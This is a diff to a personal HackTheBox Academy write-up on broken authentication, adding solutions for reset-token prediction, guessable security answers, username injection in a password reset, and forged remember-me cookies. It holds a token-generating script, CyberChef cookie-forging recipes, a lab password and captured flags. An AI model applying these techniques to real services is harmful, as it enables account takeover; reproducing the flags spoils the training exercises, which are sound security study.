@@ -154,21 +154,16 @@ Python script:
 #!/usr/bin/python3
 
 from hashlib import md5
-import requests
-from sys import exit
 from time import time
-
-# Change the url to your target / victim
-url = "http://<ip-address>:<service-port>/question1/"
 
 # To have a wide window try to bruteforce starting from 1050 seconds ago till 1050 seconds after.
 # Change now and username variables as needed. IMPORTANT! the value for now has to be epoch time
 # stamp in milliseconds, example 1654627487000 and not epoch timestamp, example 1654627487.
 
-now        = 1654627487000
+now        = 1658997918000
 start_time = now - 1050
 end_time   = now + 1050
-fail_text  = "Wrong token"
+fail_text  = "Wrong token."
 username   = "htbadmin"
 
 # loop from start_time to now. + 1 is needed because of how range() works
@@ -176,28 +171,48 @@ for x in range(start_time, end_time + 1):
     # get token md5
     timestamp = str(x)
     md5_token = md5((username+timestamp).encode()).hexdigest()
-    data = {
-        "submit": "check",
-        "token": md5_token
-    }
-
-    print("checking {} {}".format(str(x), md5_token))
-
-    # send the request
-    res = requests.post(url, data=data)
-
-    # response text check
-    if not fail_text in res.text:
-        print(res.text)
-        print("[*] Congratulations! raw reply printed before")
-        exit()
+    print(md5_token)
 ```
 
-**Answer:** ``
+Run the script to make token list.
+
+```
+┌──(kali㉿kali)-[~/Downloads]
+└─$ python3 reset_token_time_list.py > token_list.txt
+
+┌──(kali㉿kali)-[~/Downloads]
+└─$ ls
+token_list.txt		reset_token_time_list.py
+```
+
+Fuzz with ZAP.
+
+![](Pasted%20image%2020220728105416.png)
+
+After inserting it in the page:
+
+![](Pasted%20image%2020220728105504.png)
+
+**Answer:** `HTB{uns4f3t0k3ns4r3uns4f3}`
 
 ### Question 2:
+![](Pasted%20image%2020220728110513.png)
 
-**Answer:** ``
+```
+┌──(kali㉿kali)-[~/Downloads]
+└─$ echo "Njg3NDYyNzU3MzY1NzIzYTY4NzQ2Mjc1NzM2NTcyNDA2MTYzNjE2NDY1NmQ3OTJlNjg2MTYzNmI3NDY4NjU2MjZmNzgyZTY1NzUzYTc1NmU2MjcyNjU2MTZiNjE2MjZjNjU=" | base64 -d
+687462757365723a687462757365724061636164656d792e6861636b746865626f782e65753a756e627265616b61626c65
+```
+
+![](Pasted%20image%2020220728110700.png)
+
+![](Pasted%20image%2020220728110752.png)
+
+User:pass `htbadmin:Njg3NDYyNjE2NDZkNjk2ZTNhNjg3NDYyNjE2NDZkNjk2ZTQwNjE2MzYxNjQ2NTZkNzkyZTY4NjE2MzZiNzQ2ODY1NjI2Zjc4MmU2NTc1M2E3NTZlNjI3MjY1NjE2YjYxNjI2YzY1`
+
+![](Pasted%20image%2020220728110449.png)
+
+**Answer:** `HTB{4lw4y5ch3ck3nc0d1ng}`
 
 ---
 ## Guessable Answers
@@ -206,7 +221,13 @@ for x in range(start_time, end_time + 1):
 
 *Hint: Not all questions are guessable.*
 
-**Answer:** ``
+[Color Wordlist](https://raw.githubusercontent.com/imsky/wordlists/master/adjectives/colors.txt)
+
+Fuzz answer with ZAP.
+
+![](Pasted%20image%2020220728114522.png)
+
+**Answer:** `HTB{gu3ss4bl3_4n5w3r5_4r3_gu3ss4bl3}`
 
 ---
 ## Username Injection
@@ -215,26 +236,52 @@ for x in range(start_time, end_time + 1):
 
 *Hint: Inspect the fields on all pages thoroughly, and try to re-use them.*
 
-**Answer:** ``
+Catch password reset request and insert `&userid=htbadmin`.
+
+![](Pasted%20image%2020220728120901.png)
+
+Now log in as `htbadmin` with the new password.
+
+![](Pasted%20image%2020220728121012.png)
+
+**Answer:** `HTB{us3rn4m3_1nj3ct3d}`
 
 ---
 ## Bruteforcing Cookies
 ### Question 1:
 ![](./attachments/Pasted%20image%2020220714095910.png)
 
-**Answer:** ``
+![](Pasted%20image%2020220728123014.png)
+
+![](Pasted%20image%2020220728122902.png)
+
+![](Pasted%20image%2020220728123244.png)
+
+![](Pasted%20image%2020220728123340.png)
+
+**Answer:** `HTB{mu1tist3p_3nc0d1ng_15_uns4f3}`
 
 ### Question 2:
 ![](./attachments/Pasted%20image%2020220714100001.png)
 
 *Hint: Correct decoding is the key.*
 
-**Answer:** ``
+[Decoded remember me token](https://gchq.github.io/CyberChef/#recipe=URL_Decode()From_Base64('A-Za-z0-9%2B/%3D',true,false)Zlib_Inflate(0,0,'Adaptive',false,false)&input=ZUp3ckxVNHRzc29vU1NvRjB0WkYlMkJUbXBWc1VscFNtcGVTWFdKWm01cVZhR1pxYVdCZ2FtbHFabUFFNGpEbGMlM0Q)
+
+[New token](https://gchq.github.io/CyberChef/#recipe=Zlib_Deflate('Dynamic%20Huffman%20Coding')To_Base64('A-Za-z0-9%2B/%3D')URL_Encode(true)URL_Encode(true)&input=dXNlcjpodGJ1c2VyO3JvbGU6c3VwZXI7dGltZToxNjU5MDA1OTU2)
+
+![](Pasted%20image%2020220728131957.png)
+
+**Answer:** `HTB{r3m3mb3r_r3m3mb3r}`
 
 ---
 ## Skill Assessment
 ### Question:
 ![](./attachments/Pasted%20image%2020220714100046.png)
+
+Pass: ADn68LQfkavmHLfALDIR@1
+
+![](Pasted%20image%2020220728135855.png)
 
 **Answer:** ``
 
